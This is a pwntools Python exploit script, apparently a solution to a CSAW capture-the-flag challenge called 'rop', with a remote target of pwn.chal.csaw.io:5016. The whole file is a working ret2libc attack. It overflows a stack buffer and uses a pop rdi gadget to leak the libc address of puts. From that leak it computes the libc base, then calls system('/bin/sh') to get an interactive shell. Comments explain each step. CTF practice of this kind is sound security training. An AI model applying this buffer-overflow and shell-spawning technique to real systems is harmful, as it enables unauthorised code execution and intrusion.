from pwn import *

local = True
debugging = False

context(arch='amd64', os='linux')
host, port = 'pwn.chal.csaw.io', 5016
binary = './rop'
elf = ELF(binary)
libc = ELF('./libc-2.27.so')

if local:
    p = process(binary)
else:
    p = remote(host, port)

def debug(bps):
    gdbscript = ''
    for bp in bps:
        gdbscript += 'b *0x{:x}'.format(bp)
    gdb.attach(p, gdbscript=gdbscript)

if debugging:
    debug([0x400611]) # 0x400611 vuln()'s ret instruction


# Find the length of padding
"""
p.recvline() # 'Hello'
payload = cyclic(1024)
p.sendline(payload)
"""
padding_len = cyclic_find('kaaa')

# Find libc's puts address by calling puts@plt with puts@got as it's argument and calling main so we can eploit the program again
p.recvline() # 'Hello'

padding = b'A' * padding_len
puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']
pop_rdi = 0x400683 # $ ROPgadget --binary ./rop | grep -i 'pop rdi'     ## So we can put puts@got in the rdi register to work as an argument for puts@plt
log.info('puts@plt starts at  ' + hex(puts_plt))
log.info('puts@GOT starts at  ' + hex(puts_got))
log.info('main starts at      ' + hex(main))
log.info('pop rdi; ret; is at ' + hex(pop_rdi))

payload = padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
p.sendline(payload)

puts_libc = p.recvline().strip()
puts_libc = u64(puts_libc.ljust(8, b'\x00'))

# Calculate libc base address, because libc only has the offsets of it's functions.
# So the true function's address will be libc base address + libc.symbols['function_name']
# if we assign an address to libc.address, it does those calculations immediately
libc.address = puts_libc - libc.symbols['puts']

# Call system('/bin/sh') to spawn a shell
p.recvline() # 'Hello'

system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))
log.info('system starts at  ' + hex(system))
log.info('/bin/sh starts at ' + hex(bin_sh))

# we do it twice to allign the stack
payload = padding + p64(pop_rdi) + p64(bin_sh) + p64(system) + p64(pop_rdi) + p64(bin_sh) + p64(system) 
p.sendline(payload)

p.interactive()
